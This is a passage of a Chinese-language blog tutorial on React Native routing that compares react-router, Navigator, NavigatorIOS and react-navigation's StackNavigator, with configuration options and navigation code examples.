class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="静态路由"><a href="#静态路由" class="headerlink" title="静态路由"></a>静态路由</h4><p>当启动react项目时，会先生成好一个路由表，发生页面跳转时，react会根据地址到路由表中找到对应的处理页面或处理方法</p><h4 id="动态路由"><a href="#动态路由" class="headerlink" title="动态路由"></a>动态路由</h4><p>而动态路由不是作为一个项目运行的配置文件存储在外部，它在项目render的时候才开始定义，router的作者认为route应当和其它普通组件一样，它的作用不是提供路由配置，而是一个普通的UI组件</p><h2 id="React-Native路由"><a href="#React-Native路由" class="headerlink" title="React Native路由"></a>React Native路由</h2><h3 id="2-1、RN中尝试react-router的使用"><a href="#2-1、RN中尝试react-router的使用" class="headerlink" title="2.1、RN中尝试react-router的使用"></a>2.1、RN中尝试react-router的使用</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">import</span> React<span class="token punctuation">,</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">{</span> Provider <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react-redux'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">{</span> StatusBarIOS<span class="token punctuation">,</span>Platform <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react-native'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">{</span> createMemoryHistory<span class="token punctuation">,</span> Router<span class="token punctuation">,</span> IndexRoute<span class="token punctuation">,</span> Route <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react-router'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">{</span> createNavigatorRouter <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react-native-navigator-router'</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>Provider store<span class="token operator">=</span><span class="token punctuation">{</span>store<span class="token punctuation">}</span><span class="token operator">></span>    <span class="token operator">&lt;</span>Router history<span class="token operator">=</span><span class="token punctuation">{</span><span class="token function">createMemoryHistory</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">></span>        <span class="token operator">&lt;</span>Route path<span class="token operator">=</span><span class="token string">'/'</span> component<span class="token operator">=</span><span class="token punctuation">{</span><span class="token function">createNavigatorRouter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">></span>            <span class="token operator">&lt;</span>IndexRoute component<span class="token operator">=</span><span class="token punctuation">{</span>App<span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">></span>            <span class="token operator">&lt;</span>Route path<span class="token operator">=</span><span class="token string">"/about"</span> component<span class="token operator">=</span><span class="token punctuation">{</span>AllRoute<span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">></span>        <span class="token operator">&lt;</span><span class="token operator">/</span>Route<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>Router<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>Provider<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因 React Native 版本设计到0.44之后，原先的 RN 路由完全失效了</p><p>运行直接报错，createMemoryHistory(‘/‘) 异常</p><p>具体原因还是不太明白，应该是移除了react-router的使用方式</p><h3 id="2-2、RN-Navigator"><a href="#2-2、RN-Navigator" class="headerlink" title="2.2、RN Navigator"></a>2.2、RN Navigator</h3><p>首先从原理上，Navigator是用来作为<em>组件</em>之间的导航器。而缺乏类似Router性质的东西时，最简单的办法是将下个组件（也叫场景Scene），直接告诉导航器。所以就需要在页面的上面引入下个组件</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">class</span> <span class="token class-name">SampleComponent</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">{</span>        <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">let</span> defaultName <span class="token operator">=</span> <span class="token string">'FirstPageComponent'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 第一个要展示的组件</span>            <span class="token keyword">let</span> defaultComponent <span class="token operator">=</span> FirstPageComponent<span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span>            <span class="token operator">&lt;</span>Navigator              initialRoute<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span> name<span class="token punctuation">:</span> defaultName<span class="token punctuation">,</span> component<span class="token punctuation">:</span> defaultComponent <span class="token punctuation">}</span><span class="token punctuation">}</span>              configureScene<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span>route<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> Navigator<span class="token punctuation">.</span>SceneConfigs<span class="token punctuation">.</span>VerticalDownSwipeJump<span class="token punctuation">;</span>              <span class="token punctuation">}</span><span class="token punctuation">}</span>              renderScene<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span>route<span class="token punctuation">,</span> navigator<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                <span class="token keyword">let</span> Component <span class="token operator">=</span> route<span class="token punctuation">.</span>component<span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token operator">&lt;</span>Component <span class="token punctuation">{</span><span class="token operator">...</span>route<span class="token punctuation">.</span>params<span class="token punctuation">}</span> navigator<span class="token operator">=</span><span class="token punctuation">{</span>navigator<span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">></span>              <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">></span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>initialRoute<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span> name<span class="token punctuation">:</span> defaultName<span class="token punctuation">,</span> component<span class="token punctuation">:</span> defaultComponent <span class="token punctuation">}</span><span class="token punctuation">}</span>Navigator实现跳转，是通过Push和Pop方法，相当于是一个数组，每要跳到下个Scene（场景），就把下个页面push到这个数组中，当想要后退的时候，再把这个Pop出去<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>react-native 0.44 开始 不再支持 Navigatior</p><h3 id="2-3、iOS-NavigatorIOS"><a href="#2-3、iOS-NavigatorIOS" class="headerlink" title="2.3、iOS NavigatorIOS"></a>2.3、iOS NavigatorIOS</h3><p>NavigatorIOS使用</p><ul><li>首先我们需要给他指定一个路由，这样它才能知道显示哪个页面</li><li>和 Navigator 一样 NavigatorIOS 需要有个根视图来完成初始化，所以我们需要先创建一个组件来描述这个界面，并将这个组件通过路由的形式告诉 NavigatorIOS，这样就可以将这个界面展示出来</li></ul><h3 id="1、根视图"><a href="#1、根视图" class="headerlink" title="1、根视图"></a>1、根视图</h3><p>首先，创建一个 Home 组件，用来作为 NavigatorIOS 的根视图  </p><p>视图部分：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>            <span class="token operator">&lt;</span>ScrollView style<span class="token operator">=</span><span class="token punctuation">{</span>styles<span class="token punctuation">.</span>flex<span class="token punctuation">}</span><span class="token operator">></span>                <span class="token operator">&lt;</span>View style<span class="token operator">=</span><span class="token punctuation">{</span>styles<span class="token punctuation">.</span>container<span class="token punctuation">}</span><span class="token operator">></span>                    <span class="token operator">&lt;</span>Text onPress<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>goTo<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">></span>点我跳转详情<span class="token operator">&lt;</span><span class="token operator">/</span>Text<span class="token operator">></span>                <span class="token operator">&lt;</span><span class="token operator">/</span>View<span class="token operator">></span>            <span class="token operator">&lt;</span><span class="token operator">/</span>ScrollView<span class="token operator">></span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>样式部分：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> styles <span class="token operator">=</span> StyleSheet<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    flex<span class="token punctuation">:</span> <span class="token punctuation">{</span>        flex<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        marginTop<span class="token punctuation">:</span> <span class="token number">65</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    listItem<span class="token punctuation">:</span> <span class="token punctuation">{</span>        height<span class="token punctuation">:</span> <span class="token number">40</span><span class="token punctuation">,</span>        marginLeft<span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">,</span>        marginRight<span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">,</span>        borderBottomWidth<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        borderBottomColor<span class="token punctuation">:</span> <span class="token string">"#ddd"</span><span class="token punctuation">,</span>        justifyContent<span class="token punctuation">:</span> <span class="token string">"center"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    listItemFont<span class="token punctuation">:</span> <span class="token punctuation">{</span>        fontSize<span class="token punctuation">:</span> <span class="token number">16</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    container<span class="token punctuation">:</span> <span class="token punctuation">{</span>        justifyContent<span class="token punctuation">:</span> <span class="token string">"center"</span><span class="token punctuation">,</span>        alignItems<span class="token punctuation">:</span> <span class="token string">"center"</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2、实例化路由设置"><a href="#2、实例化路由设置" class="headerlink" title="2、实例化路由设置"></a>2、实例化路由设置</h3><p>然后我们实例化一个 NavigatorIOS 并设置路由</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token keyword">extends</span> <span class="token class-name">Component</span> <span class="token punctuation">{</span>    <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>            <span class="token operator">&lt;</span>NavigatorIOS                style<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span> flex<span class="token punctuation">:</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>                initialRoute<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>                    component<span class="token punctuation">:</span> List<span class="token punctuation">,</span><span class="token comment" spellcheck="true">// 要跳转的页面</span>                    title<span class="token punctuation">:</span> <span class="token string">"列表"</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">// 跳转页面导航栏标题</span>                    passProps<span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>                <span class="token punctuation">}</span><span class="token punctuation">}</span>            <span class="token operator">/</span><span class="token operator">></span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3、效果"><a href="#3、效果" class="headerlink" title="3、效果"></a>3、效果</h3><p><img src="https://p5.ssl.qhimg.com/t01dcf818861f4f3464.png" alt></p><h3 id="4、跳转和返回"><a href="#4、跳转和返回" class="headerlink" title="4、跳转和返回"></a>4、跳转和返回</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">return</span> <span class="token punctuation">(</span>                <span class="token operator">&lt;</span>View style<span class="token operator">=</span><span class="token punctuation">{</span>styles<span class="token punctuation">.</span>container<span class="token punctuation">}</span><span class="token operator">></span>                    <span class="token operator">&lt;</span>TouchableOpacity                        onPress<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span>navigator<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                            component<span class="token punctuation">:</span>Detail<span class="token punctuation">,</span>     <span class="token comment" spellcheck="true">// 需要跳转的页面</span>                            title<span class="token punctuation">:</span><span class="token string">'详情'</span>       <span class="token comment" spellcheck="true">// 跳转页面导航栏标题</span>                            rightButtonTitle<span class="token punctuation">:</span> <span class="token string">"收藏"</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//跳转页面导航右侧按钮</span>                            onRightButtonPress<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//右侧按钮点击回调事件</span>                                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"点击了收藏按钮。"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>                    <span class="token operator">></span>                        <span class="token operator">&lt;</span>Text<span class="token operator">></span>点击跳转页面<span class="token operator">&lt;</span><span class="token operator">/</span>Text<span class="token operator">></span>                    <span class="token operator">&lt;</span><span class="token operator">/</span>TouchableOpacity<span class="token operator">></span>                 <span class="token operator">&lt;</span><span class="token operator">/</span>View<span class="token operator">></span>            <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5、整体效果"><a href="#5、整体效果" class="headerlink" title="5、整体效果"></a>5、整体效果</h3><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/publish/luyou1.png" alt></p><h2 id="react-navigation"><a href="#react-navigation" class="headerlink" title="react-navigation"></a>react-navigation</h2><h3 id="3-0、引言"><a href="#3-0、引言" class="headerlink" title="3.0、引言"></a>3.0、引言</h3><p>由于前面介绍的几种路由方式要么随着RN版本更新已不再支持，要么是单平台支持性；RN官方在0.44版本以后把导航路由集中到了react-navigation库里面，并且官方也事件使用react-navigation，少用第三方插件</p><p>添加react-navigation</p><p>该库包含三类组件：</p><ul><li>StackNavigator：用来跳转页面和传递参数</li><li>TabNavigator：类似底部导航栏，用来在同一屏切换不同页面</li><li>DrawerNavigator：侧滑菜单导航栏，用于轻松设置带抽屉的屏幕</li></ul><pre class="line-numbers language-js"><code class="language-js">npm install <span class="token operator">--</span>save react<span class="token operator">-</span>navigation<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>方法引用：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">import</span> <span class="token punctuation">{</span> StackNavigator <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react-navigation"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-1、StackNavigator"><a href="#3-1、StackNavigator" class="headerlink" title="3.1、StackNavigator"></a>3.1、StackNavigator</h3><p>组件采用堆栈式的页面导航来实现各个界面跳转。它的构造函数：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token function">StackNavigator</span><span class="token punctuation">(</span>RouteConfigs<span class="token punctuation">,</span> StackNavigatorConfig<span class="token punctuation">)</span>RouteConfigs：页面路由配置StackNavigatorConfig：路由参数配置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="3-1-1、StackNavigator参数"><a href="#3-1-1、StackNavigator参数" class="headerlink" title="3.1.1、StackNavigator参数"></a>3.1.1、StackNavigator参数</h4><pre class="line-numbers language-js"><code class="language-js">navigationOptions：配置StackNavigator的一些属性。      title：标题，如果设置了这个导航栏和标签栏的title就会变成一样的，不推荐使用      header：可以设置一些导航的属性，如果隐藏顶部导航栏只要将这个属性设置为<span class="token keyword">null</span>      headerTitle：设置导航栏标题，推荐      headerBackTitle：设置跳转页面左侧返回箭头后面的文字，默认是上一个页面的标题。可以自定义，也可以设置为<span class="token keyword">null</span>      headerTruncatedBackTitle：设置当上个页面标题不符合返回箭头后的文字时，默认改成<span class="token string">"返回"</span>      headerRight：设置导航条右侧。可以是按钮或者其他视图控件      headerLeft：设置导航条左侧。可以是按钮或者其他视图控件      headerStyle：设置导航条的样式。背景色，宽高等      headerTitleStyle：设置导航栏文字样式      headerBackTitleStyle：设置导航栏‘返回’文字样式      headerTintColor：设置导航栏颜色      headerPressColorAndroid：安卓独有的设置颜色纹理，需要安卓版本大于<span class="token number">5.0</span>      gesturesEnabled：是否支持滑动返回手势，iOS默认支持，安卓默认关闭  screen：对应界面名称，需要填入<span class="token keyword">import</span>之后的页面  mode：定义跳转风格     card：使用iOS和安卓默认的风格     modal：iOS独有的使屏幕从底部画出。类似iOS的present效果  headerMode：返回上级页面时动画效果     float：iOS默认的效果     screen：滑动过程中，整个页面都会返回     none：无动画  cardStyle：自定义设置跳转效果     transitionConfig： 自定义设置滑动返回的配置     onTransitionStart：当转换动画即将开始时被调用的功能     onTransitionEnd：当转换动画完成，将被调用的功能  path：路由中设置的路径的覆盖映射配置  initialRouteName：设置默认的页面组件，必须是上面已注册的页面组件  initialRouteParams：初始路由参数 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-1-2、RouteConfigs配置"><a href="#3-1-2、RouteConfigs配置" class="headerlink" title="3.1.2、RouteConfigs配置"></a>3.1.2、RouteConfigs配置</h4><p>可以只配置RouteConfigs参数<br>RouteConfigs参数表示各个页面路由配置，React开发中的 Router路由配置 ，它是让导航器知道需要导航的路由对应的页面</p><p>RN页面路由配置：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> AppIndex <span class="token operator">=</span> <span class="token function">StackNavigator</span><span class="token punctuation">(</span>    <span class="token punctuation">{</span>         Task<span class="token punctuation">:</span> <span class="token punctuation">{</span>            screen<span class="token punctuation">:</span> Task，            <span class="token comment" spellcheck="true">//加载首屏需要在navigationOptions里面配置首页导航信息</span>        navigationOptions<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">{</span> navigation <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token punctuation">{</span>                headerTitle<span class="token punctuation">:</span> <span class="token string">"首页"</span><span class="token punctuation">,</span>                headerBackTitle<span class="token punctuation">:</span> <span class="token keyword">null</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        NewTask<span class="token punctuation">:</span> <span class="token punctuation">{</span>            screen<span class="token punctuation">:</span> NewTask        <span class="token punctuation">}</span><span class="token punctuation">,</span>        Redeem<span class="token punctuation">:</span> <span class="token punctuation">{</span>            screen<span class="token punctuation">:</span> Redeem        <span class="token punctuation">}</span><span class="token punctuation">,</span>        Rule<span class="token punctuation">:</span> <span class="token punctuation">{</span>            screen<span class="token punctuation">:</span> Rule        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-1-3、路由跳转"><a href="#3-1-3、路由跳转" class="headerlink" title="3.1.3、路由跳转"></a>3.1.3、路由跳转</h4><p>已经配置好导航器以及对应的路由页面了，但是要完成页面之间的跳转，还需要 navigation；</p><p>在导航器中的每一个页面，都有 navigation 属性</p><pre class="line-numbers language-js"><code class="language-js">页面的配置选项 navigationOptions 通常还可以在对应页面中去静态配置，比如在 Redeem 页面中（注意：如果默认是首页的话就不要再页面中声明<span class="token keyword">static</span> navigationOptions了）<span class="token keyword">class</span> <span class="token class-name">Redeem</span> <span class="token keyword">extends</span> <span class="token class-name">Component</span> <span class="token punctuation">{</span>    <span class="token keyword">static</span> navigationOptions <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">{</span> navigation <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token punctuation">{</span>        headerTitle<span class="token punctuation">:</span> <span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>navigation<span class="token punctuation">.</span>state<span class="token punctuation">.</span>params<span class="token punctuation">.</span>title<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">,</span>        headerRight<span class="token punctuation">:</span> <span class="token punctuation">(</span>            <span class="token operator">&lt;</span>View style<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span> flexDirection<span class="token punctuation">:</span> <span class="token string">"row"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">></span>                <span class="token operator">&lt;</span>Text                    style<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span> color<span class="token punctuation">:</span> <span class="token string">"#333"</span><span class="token punctuation">,</span> marginRight<span class="token punctuation">:</span> <span class="token number">13</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>                    onPress<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span>navigation<span class="token punctuation">.</span>state<span class="token punctuation">.</span>params <span class="token operator">?</span> navigation<span class="token punctuation">.</span>state<span class="token punctuation">.</span>params<span class="token punctuation">.</span><span class="token function">jumpToRule</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">null</span>                    <span class="token punctuation">}</span><span class="token operator">></span>                    兑换规则                <span class="token operator">&lt;</span><span class="token operator">/</span>Text<span class="token operator">></span>            <span class="token operator">&lt;</span><span class="token operator">/</span>View<span class="token operator">></span>        <span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span>一般子页面navigationOptions参数最好都在子页面里面去配置，不要在首页到导航参数里面配置，方便调用本类方法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-1-4、navigation属性"><a href="#3-1-4、navigation属性" class="headerlink" title="3.1.4、navigation属性"></a>3.1.4、navigation属性</h4><h5 id="navigate-跳转到其他页面"><a href="#navigate-跳转到其他页面" class="headerlink" title="navigate - 跳转到其他页面"></a>navigate - 跳转到其他页面</h5><p>调用这个方法可以跳转到导航器中的其他页面，此方法有三个参数</p><ul><li>routeName 导航器中配置的路由名称</li><li>params 传递参数到下一个页面</li><li>action action</li></ul><p>首先在页面需要跳转的地方声明navigate</p><p>const { navigate } = this.props.navigation;</p><p>然后通过点击事件调用navigate跳转</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//首页跳转积分兑换页面</span><span class="token operator">&lt;</span>TouchableOpacity    style<span class="token operator">=</span><span class="token punctuation">{</span>styles<span class="token punctuation">.</span>redeem<span class="token punctuation">}</span>    onPress<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">navigate</span><span class="token punctuation">(</span><span class="token string">"Redeem"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> title<span class="token punctuation">:</span> <span class="token string">"积分兑换"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">></span>    <span class="token operator">&lt;</span>Text style<span class="token operator">=</span><span class="token punctuation">{</span>styles<span class="token punctuation">.</span>redeemText<span class="token punctuation">}</span><span class="token operator">></span>积分兑换<span class="token operator">&lt;</span><span class="token operator">/</span>Text<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>TouchableOpacity<span class="token operator">></span><span class="token comment" spellcheck="true">//积分兑换页面跳转兑换规则页面</span>jumpToRule <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> <span class="token punctuation">{</span> navigate <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span>navigation<span class="token punctuation">;</span>        <span class="token function">navigate</span><span class="token punctuation">(</span><span class="token string">"Rule"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> title<span class="token punctuation">:</span> <span class="token string">"积分兑换规则"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="state-当前页面导航器的状态"><a href="#state-当前页面导航器的状态" class="headerlink" title="state - 当前页面导航器的状态"></a>state - 当前页面导航器的状态</h5><p>state 里面包含有传递过来的参数 params 、 key 、路由名称 routeName</p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">{</span>    params<span class="token punctuation">:</span> <span class="token punctuation">{</span> param<span class="token punctuation">:</span> <span class="token string">'i am the param'</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>    key<span class="token punctuation">:</span> <span class="token string">'id-1500546317301-1'</span><span class="token punctuation">,</span>    routeName<span class="token punctuation">:</span> <span class="token string">'Redeem'</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用：</p><pre class="line-numbers language-js"><code class="language-js">headerTitle<span class="token punctuation">:</span> <span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>navigation<span class="token punctuation">.</span>state<span class="token punctuation">.</span>params<span class="token punctuation">.</span>title<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="setParams-更改路由的参数"><a href="#setParams-更改路由的参数" class="headerlink" title="setParams - 更改路由的参数"></a>setParams - 更改路由的参数</h5><p>更改当前页面路由的参数，比如可以用来更新头部的按钮或者标题</p><p>setParams的使用：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//导航右侧按钮 点击调用本来方法</span>headerRight<span class="token punctuation">:</span> <span class="token punctuation">(</span>            <span class="token operator">&lt;</span>View style<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span> flexDirection<span class="token punctuation">:</span> <span class="token string">"row"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">></span>                <span class="token operator">&lt;</span>Text                    style<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span> color<span class="token punctuation">:</span> <span class="token string">"#333"</span><span class="token punctuation">,</span> marginRight<span class="token punctuation">:</span> <span class="token number">13</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>                    onPress<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span>                        navigation<span class="token punctuation">.</span>state<span class="token punctuation">.</span>params <span class="token operator">?</span> navigation<span class="token punctuation">.</span>state<span class="token punctuation">.</span>params<span class="token punctuation">.</span><span class="token function">jumpToRule</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">null</span>                    <span class="token punctuation">}</span><span class="token operator">></span>                    兑换规则                <span class="token operator">&lt;</span><span class="token operator">/</span>Text<span class="token operator">></span>            <span class="token operator">&lt;</span><span class="token operator">/</span>View<span class="token operator">></span>        <span class="token punctuation">)</span><span aria-hidden="true" 